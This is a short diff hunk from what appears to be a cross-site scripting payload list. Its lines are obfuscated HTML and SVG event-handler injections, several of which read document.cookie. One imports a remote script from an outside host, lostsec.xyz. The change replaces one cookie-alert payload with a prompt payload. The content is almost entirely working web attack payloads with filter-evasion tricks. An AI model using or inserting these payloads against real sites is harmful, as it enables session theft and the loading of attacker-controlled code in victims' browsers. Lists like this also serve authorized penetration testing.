@@ -7,7 +7,7 @@ OnXSS=<Img/Src/OnError​=(alert)(1)>
 <body onload​=alert('XSS')>
 '"><svg/onload=import('https://lostsec.xyz/coffin/xss.js')>
 ">>>>>><marquee>RXSS</marquee></head><abc><​/script><​script>alert(document.cookie)<​/script><​meta
-orwa%27\"><svg/onload​=alert(document.cookie)>
+"><svg/onload=prompt('H6nt3r')>
 "<!--><Svg+OnLoad%3dconfirm%3f.(%2fcypher😈%2f)<!--1")
 <svg/onload=window["al"+"ert"]1337>
 <Svg Only=1 OnLoad=confirm(document.domain)>
